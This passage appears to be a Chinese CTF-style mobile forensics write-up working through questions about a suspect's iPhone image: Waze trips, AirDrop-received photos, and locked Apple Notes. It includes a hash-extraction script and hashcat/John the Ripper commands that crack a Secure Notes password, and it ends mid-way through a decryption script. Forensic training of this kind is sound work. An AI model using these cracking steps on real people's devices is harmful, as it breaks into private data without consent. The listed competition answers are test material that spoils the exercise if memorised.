+<img src="http://picture.928330.xyz/typora/image-20250814124731728.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814124731728"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>D0CF11E0
+</span></span></code></pre></div><h2 id="30承上题该pdf档案内包含一位曾经被肩的受害者资料分析林熙手机的数据这位受害者的英文名字是什么不要输入符号及空白以大写英文回答">30.承上题，该PDF档案内包含一位曾经被肩的受害者资料。分析林熙手机的数据，这位受害者的英文名字是什么?(不要输入符号及空白，以大写英文回答)
+</h2><p>尝试直接打开失败，说不是pdf格式：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814124906161.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814124906161"
+	
+	
+></p>
+<p>哎呀，这才反应过来不是PDF文件，开头特征是office应用的，但是不知道是哪一种</p>
+<p>我们拖到linux里面使用file命令测试一下（截图太长就不放了）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(kali㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ file 111.pdf
+</span></span><span style="display:flex;"><span>111.pdf: Composite Document File V2 Document, Little Endian, Os: MacOS, Version 6.12, Code page: 10000, Author: user30, Last Saved By: user30, Name of Creating Application: Microsoft Macintosh Excel, Create Time/Date: Wed Sep 28 12:06:13 2022, Last Saved Time/Date: Fri Sep 30 10:37:41 2022, Security: 0
+</span></span></code></pre></div><p>输出里面的<code>Composite Document File V2 Document</code>表明这是 OLE 容器格式，而<code>Microsoft Macintosh Excel</code>说明是 Excel生成的OLE文档，也就是<code>.xls</code>文件</p>
+<p>修改后缀名打开：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814133348736.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814133348736"
+	
+	
+></p>
+<p>林俊熙的手机好友消息里面只有一个消息与人名有关，在里面就找到了存在于表里面的人：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814133501991.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814133501991"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>WONG SAI PING
+</span></span></code></pre></div><h2 id="31分析林浚熙手机上的数据他在2022年10月17日计划去什么地方">31.分析林浚熙手机上的数据，他在2022年10月17日计划去什么地方?
+</h2><p><strong>A. 以上皆非</strong></p>
+<p><strong>B. 荃湾站</strong></p>
+<p><strong>C. 沙田站</strong></p>
+<p><strong>D. 国际金融中心二期</strong></p>
+<p>在手机上发现了waze软件， 是一款非GPS导航与实时路况应用</p>
+<p>但分析出来的内容里面没有10月17日的行程：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814134058784.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814134058784"
+	
+	
+></p>
+<p>再去文件里面找一下waze，在ChunHei_iPhone.tar/AppDomain-com.waze.iphone/Documents路径下发现两个数据库，一个个查找，最终在user.db下找到了一个表，里面有时间和地点：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814134303108.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814134303108"
+	
+	
+></p>
+<p>这两个地点都在选项里面，时间是时间戳类型，都转换一下：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814134353181.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814134353181"
+	
+	
+></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814134317122.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814134317122"
+	
+	
+></p>
+<p>第二个是17号的数据</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>C
+</span></span></code></pre></div><h2 id="32承上题上述行程的结束时间是如答案为-10159需回答160159">32.承上题，上述行程的结束时间是?(如答案为 1:01:59，需回答160159)
+</h2><p>同上题图：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814134627149.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814134627149"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>124500
+</span></span></code></pre></div><p>题目给的例子有问题吧</p>
+<h2 id="33于林浚熙的手机里在2022年9月1日或以后哪一张照片是由其他手机拍摄的而它的档案名是什么不要输入以大写英文及阿拉伯数字回答如-cat10jpg需回答cat10jpg">33.于林浚熙的手机里，在2022年9月1日或以后，哪一张照片是由其他手机拍摄的，而它的档案名是什么?(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG)
+</h2><p>使用耗时任务的图片exif分析，分析完之后点左上角切换成行视图，再点击右边的设置列，把型号勾选上：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814144026870.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814144026870"
+	
+	
+></p>
+<p>过滤拍摄时间是2022-9-1之后的图片，发现有四张（实际三张）不是林俊熙的手机iphone XR，而是XS：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814143917249.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814143917249"
+	
+	
+></p>
+<p>然后做到这里就卡住了，题目说只有一张，但不知道怎么分辨</p>
+<h2 id="34根据照片的数据库photossqlite-资料哪一个栏目标题column-header-可以显示这张照片的接收方式">34.根据照片的数据库（Photos.sqlite) 资料，哪一个栏目标题(Column Header) 可以显示这张照片的接收方式?
+</h2><p><strong>A. ZIMPORTEDFROMSOURCEIDENTIFIER</strong></p>
+<p><strong>B. ZIMPORTEDBYBUNDLEIDENTIFIER</strong></p>
+<p><strong>C. ZRECEIVEMETHODIDENTIFIER</strong></p>
+<p><strong>D. ZRECEIVEDFROMIDENTIFIER</strong></p>
+<p>搜索这个数据库：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814144334530.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814144334530"
+	
+	
+></p>
+<p>连接后查询四个选项哪一个在表里面，sqlite的机制和常见的mysql不一样，交给ai就好：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#98c379">&#39;ZIMPORTEDFROMSOURCEIDENTIFIER&#39;</span> <span style="color:#c678dd">AS</span> <span style="color:#c678dd">column_name</span>, <span style="color:#e06c75">name</span> <span style="color:#c678dd">AS</span> <span style="color:#c678dd">table_name</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">FROM</span> <span style="color:#e06c75">sqlite_master</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">WHERE</span> <span style="color:#c678dd">type</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;table&#39;</span> <span style="color:#c678dd">AND</span> <span style="color:#c678dd">sql</span> <span style="color:#c678dd">LIKE</span> <span style="color:#98c379">&#39;%ZIMPORTEDFROMSOURCEIDENTIFIER%&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">UNION</span> <span style="color:#c678dd">ALL</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#98c379">&#39;ZIMPORTEDBYBUNDLEIDENTIFIER&#39;</span>, <span style="color:#e06c75">name</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">FROM</span> <span style="color:#e06c75">sqlite_master</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">WHERE</span> <span style="color:#c678dd">type</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;table&#39;</span> <span style="color:#c678dd">AND</span> <span style="color:#c678dd">sql</span> <span style="color:#c678dd">LIKE</span> <span style="color:#98c379">&#39;%ZIMPORTEDBYBUNDLEIDENTIFIER%&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">UNION</span> <span style="color:#c678dd">ALL</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#98c379">&#39;ZRECEIVEMETHODIDENTIFIER&#39;</span>, <span style="color:#e06c75">name</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">FROM</span> <span style="color:#e06c75">sqlite_master</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">WHERE</span> <span style="color:#c678dd">type</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;table&#39;</span> <span style="color:#c678dd">AND</span> <span style="color:#c678dd">sql</span> <span style="color:#c678dd">LIKE</span> <span style="color:#98c379">&#39;%ZRECEIVEMETHODIDENTIFIER%&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">UNION</span> <span style="color:#c678dd">ALL</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#98c379">&#39;ZRECEIVEDFROMIDENTIFIER&#39;</span>, <span style="color:#e06c75">name</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">FROM</span> <span style="color:#e06c75">sqlite_master</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">WHERE</span> <span style="color:#c678dd">type</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;table&#39;</span> <span style="color:#c678dd">AND</span> <span style="color:#c678dd">sql</span> <span style="color:#c678dd">LIKE</span> <span style="color:#98c379">&#39;%ZRECEIVEDFROMIDENTIFIER%&#39;</span>;
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250814145144022.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814145144022"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e06c75">B</span>
+</span></span></code></pre></div><h2 id="35承上题这张照片通过什么方式接收">35.承上题，这张照片通过什么方式接收?
+</h2><p><strong>A. 网页下载</strong></p>
+<p><strong>B. 蓝牙传送</strong></p>
+<p><strong>C. 以上皆非</strong></p>
+<p><strong>D. WhatsApp软件传送</strong></p>
+<p><strong>E. Signal软件传送</strong></p>
+<p>上一题我们找到了含有接受方式字段的表格，一共有三张，经过查看发现ZADDITIONALASSETATTRIBUTES才是我们想要找的存储了所有图片的表格，利用sql查询33题找到的四张图片就行了吧：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#e06c75">ZORIGINALFILENAME</span>, <span style="color:#e06c75">ZIMPORTEDBYBUNDLEIDENTIFIER</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">FROM</span> <span style="color:#e06c75">ZADDITIONALASSETATTRIBUTES</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">ZORIGINALFILENAME</span> <span style="color:#c678dd">IN</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#39;IMG_0420.HEIC&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#39;IMG_0421.HEIC&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#39;IMG_0422.HEIC&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#39;IMG_0446.HEIC&#39;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250814172545644.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814172545644"
+	
+	
+></p>
+<p>什么？竟然一张都没有找到！难道这几张图片根本就不存在？？？！！！</p>
+<p>再次返回表格，确实没有看见这几张图片，不过比对他们的时间却发现了猫腻：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814172944623.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814172944623"
+	
+	
+></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814173022613.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814173022613"
+	
+	
+></p>
+<p>在数据库里面，这几张来自其他手机的、以.HEIC作为后缀的图片，似乎被重新命名了，有了另一个名称</p>
+<p>而且，这时也发现前文的IMG_0420.HEIC和IMG_0423.HEIC是同一张图片，不知道为什么存储了两次</p>
+<p>不过这些都不重要，知道了真正的名称，我们改动一下接着查询：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#e06c75">ZORIGINALFILENAME</span>, <span style="color:#e06c75">ZIMPORTEDBYBUNDLEIDENTIFIER</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">FROM</span> <span style="color:#e06c75">ZADDITIONALASSETATTRIBUTES</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">ZORIGINALFILENAME</span> <span style="color:#c678dd">IN</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#39;IMG_0381.HEIC&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#39;IMG_0383.HEIC&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#39;IMG_0730.HEIC&#39;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250814173803319.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814173803319"
+	
+	
+></p>
+<p>四张图片的来源都是com.apple.sharingd，然后告诉ai大人吧：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814174129947.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814174129947"
+	
+	
+></p>
+<p>原来是airdrop，这玩意可比选项里面的快多了</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">C</span>
+</span></span></code></pre></div><h2 id="36承上题这张照片原本的档案名original-filename-是什么不要输入以大写英文及阿拉伯数字回答如-cat10jpg需回答cat10jpg">36.承上题，这张照片原本的档案名(Original Filename) 是什么?不要输入，以大写英文及阿拉伯数字回答。如 Cat10,jpg，需回答CAT10JPG)
+</h2><p>看来上一题得到的名称还是很重要的</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e06c75">IMG0730HEIC</span>
+</span></span></code></pre></div><h2 id="37林浚熙手机里有一个备忘录notes被上了锁这个备忘录的名称是什么以大写英文及阿拉数字回答">37.林浚熙手机里有一个备忘录(Notes)被上了锁，这个备忘录的名称是什么?(以大写英文及阿拉数字回答)
+</h2><p>note里面一共四个备忘录数据，其中&quot;halo&quot;和&quot;今天&quot;两条数据是看不见的，不确定是哪个</p>
+<p>不过下一题会给出答案</p>
+<h2 id="38承上题上述备忘录的内容有一串数字它是什么以阿拉伯数字回答">38.承上题，上述备忘录的内容有一串数字，它是什么?(以阿拉伯数字回答)
+</h2><p>上网查找破解notes密码的方法，找到了下面这篇文章：</p>
+<p><a class="link" href="https://www.kaotenforensic.com/cellebrite/blog/bruteforce-securenotes-hashcat/"  target="_blank" rel="noopener"
+    >https://www.kaotenforensic.com/cellebrite/blog/bruteforce-securenotes-hashcat/
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></p>
+<p>其中有着这样一段话：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814181220752.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814181220752"
+	
+	
+></p>
+<p>原来看数据库就能知道哪一个数据被加密了，看来以后得多看才是，我们导出看一眼：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250814181640051.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814181640051"
+	
+	
+></p>
+<p>果真找到了对应数据，sql查询一下：</p>
+<ul>
+<li><code>ZCRYPTOITERATIONCOUNT</code> 显示加密迭代次数</li>
+<li><code>ZISPASSWORDPROTECTED</code>=1表示有密码保护，0表示没有</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">ZTITLE1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">ZCRYPTOITERATIONCOUNT</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">ZISPASSWORDPROTECTED</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">FROM</span> <span style="color:#e06c75">ZICCLOUDSYNCINGOBJECT</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">ZTITLE1</span> <span style="color:#c678dd">IN</span> (<span style="color:#98c379">&#39;Halo&#39;</span>, <span style="color:#98c379">&#39;今天&#39;</span>);
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250814182234517.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250814182234517"
+	
+	
+></p>
+<p>什么，竟然这两个都真的被加密了，那谁还分得清啊！</p>
+<p>不要紧，正确答案是可以被解密出来有一串数字的，我们接着往下做</p>
+<p>notes加密的原理大概就是使用PBKDF2和SHA256算法把简单密码通过反复的哈希拉伸成一个16字节密钥，那么我们就可以想办法从数据库文件（也就是NoteStore.sqlite）里面提取出这个hash，再对它进行爆破</p>
+<p>文章里给出了提取hash的perl语言脚本，这里我们保存成iOS_notes.pl：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/bin/env perl</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">use</span> <span style="color:#e06c75">strict</span>;
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">use</span> <span style="color:#e06c75">warnings</span>;
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">use</span> <span style="color:#e06c75">DBI</span>;
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">use</span> <span style="color:#e06c75">DBD::SQLite</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">die</span> <span style="color:#98c379">&#34;usage: $0 NoteStore.sqlite\n&#34;</span> <span style="color:#c678dd">unless</span> (<span style="color:#e5c07b">scalar</span> <span style="color:#e06c75">@ARGV</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">my</span> <span style="color:#e06c75">$database</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">shift</span> <span style="color:#e06c75">@ARGV</span>;
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">my</span> <span style="color:#e06c75">$dsn</span>      <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;DBI:SQLite:dbname=$database&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">my</span> <span style="color:#e06c75">$userid</span>   <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">my</span> <span style="color:#e06c75">$password</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">my</span> <span style="color:#e06c75">$dbh</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">DBI</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e5c07b">connect</span> (<span style="color:#e06c75">$dsn</span>, <span style="color:#e06c75">$userid</span>, <span style="color:#e06c75">$password</span>, { <span style="color:#e06c75">RaiseError</span> <span style="color:#56b6c2">=&gt;</span> <span style="color:#d19a66">1</span> }) <span style="color:#56b6c2">or</span> <span style="color:#e5c07b">die</span> <span style="color:#e06c75">$</span><span style="color:#e06c75">DBI::</span><span style="color:#e06c75">errstr</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">my</span> <span style="color:#e06c75">$sth</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$dbh</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">prepare</span> (<span style="color:#98c379">&#34;SELECT Z_PK,ZCRYPTOITERATIONCOUNT,ZCRYPTOSALT,ZCRYPTOWRAPPEDKEY FROM ZICCLOUDSYNCINGOBJECT WHERE ZISPASSWORDPROTECTED=1&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sth</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">execute</span> () <span style="color:#56b6c2">or</span> <span style="color:#e5c07b">die</span> <span style="color:#e06c75">$</span><span style="color:#e06c75">DBI::</span><span style="color:#e06c75">errstr</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">while</span> (<span style="color:#c678dd">my</span> <span style="color:#e06c75">$row</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$sth</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">fetchrow_arrayref</span> ())
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">printf</span> (<span style="color:#98c379">&#34;\$ASN\$*%d*%d*%s*%s\n&#34;</span>, <span style="color:#e06c75">$row</span><span style="color:#56b6c2">-&gt;</span>[<span style="color:#d19a66">0</span>], <span style="color:#e06c75">$row</span><span style="color:#56b6c2">-&gt;</span>[<span style="color:#d19a66">1</span>], <span style="color:#e5c07b">unpack</span> (<span style="color:#98c379">&#34;H*&#34;</span>, <span style="color:#e06c75">$row</span><span style="color:#56b6c2">-&gt;</span>[<span style="color:#d19a66">2</span>]), <span style="color:#e5c07b">unpack</span> (<span style="color:#98c379">&#34;H*&#34;</span>, <span style="color:#e06c75">$row</span><span style="color:#56b6c2">-&gt;</span>[<span style="color:#d19a66">3</span>]));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sth</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">finish</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$dbh</span><span style="color:#56b6c2">-&gt;</span><span style="color:#e06c75">disconnect</span> ();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e5c07b">exit</span> (<span style="color:#d19a66">0</span>);
+</span></span></code></pre></div><p>我们也可以直接手动从数据库里面复制出来hash值，不过有现成的脚本不用白不用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#e06c75">perl</span> <span style="color:#e06c75">iOS_notes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">pl</span> <span style="color:#e06c75">NoteStore</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sqlite</span> <span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">txt</span>
+</span></span></code></pre></div><p>而Apple Secure Notes的设计是一个账户的所有安全备忘录可以用同一个自定义密码解锁，也就是说不管我们取出来多少加密过的hash，只要破解出来一个就可以：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>head  -n <span style="color:#d19a66">1</span> hash.txt &gt; hash_first.txt
+</span></span></code></pre></div><p>Apple Secure Notes的加密算法对应16200这个模式，我们指定然后运行，这里用的是kali自带字典：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hashcat -m <span style="color:#d19a66">16200</span> -a <span style="color:#d19a66">0</span> hash_first.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>然而我是在一台Kali虚拟机里操作的，虚拟机环境无法直接调用物理GPU，Hashcat只能切换到CPU模式</p>
+<p>行吧，CPU就CPU，慢点就慢点，但第二个问题出现了：Hashcat的通用CPU驱动内存分配上限很低，而<code>-m 16200</code>恰恰要很多内存，这就导致跑不动破解的哈希算法</p>
+<p>为了解决这个问题，我折腾了很久：修复Kali的apt源、安装开源驱动、都没有用</p>
+<p>最后只能换一个工具（早呷西想到的）：John the Ripper，据说对CPU的支持非常出色，没有内存限制问题，而且kali也默认安装了它：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john --wordlist<span style="color:#56b6c2">=</span>/usr/share/wordlists/rockyou.txt hash_first.txt
+</span></span></code></pre></div><p>最后运行很成功，查看破解密码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john --show hash_first.txt
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250815120251437.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815120251437"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>234567
+</span></span></code></pre></div><p>不过到这一步只是有密码而已，我们还需要得到内容</p>
+<p>我们还是处理NoteStore.sqlite数据库，加密数据可能在两个地方：<code>ZICNOTEDATA</code>表的<code>ZDATA</code>列（通常是笔记主体）或者<code>ZICCLOUDSYNCINGOBJECT</code>表的<code>ZENCRYPTEDVALUESJSON</code>列（通常是附件元数据等）</p>
+<p>或许最简单的方式就是手机仿真然后直接打开notes看一眼吧（我猜的），不过我并不知道如何这样做，也不知道能不能这样做，最后调教了很久的ai，处理了很久的环境问题，写出来了一个python脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">sqlite3</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">sys</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">zlib</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">Crypto.Cipher</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">AES</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">Crypto.Protocol.KDF</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">PBKDF2</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">Crypto.Hash</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">SHA256</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.hazmat.primitives.keywrap</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">aes_key_unwrap</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.hazmat.backends</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">default_backend</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">decrypt_aes_gcm</span>(<span style="color:#e06c75">key</span>, <span style="color:#e06c75">nonce</span>, <span style="color:#e06c75">ciphertext</span>, <span style="color:#e06c75">tag</span>):
